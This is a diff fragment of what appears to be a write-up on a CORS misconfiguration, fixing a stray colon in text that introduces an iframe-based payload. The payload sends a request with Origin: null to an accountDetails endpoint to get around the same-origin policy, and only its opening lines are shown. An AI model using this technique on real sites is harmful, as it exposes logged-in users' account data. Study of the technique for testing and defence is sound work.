@@ -49,7 +49,7 @@ Access-Control-Allow-Credentials: true
 }
 ```
 
-:Using the Iframe technique to execute the call to accountDetails with an Origin: null in order to get the relaxation for SOP:
+Using the Iframe technique to execute the call to accountDetails with an Origin: null in order to get the relaxation for SOP:
 ```html
 <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
 var req = new XMLHttpRequest();
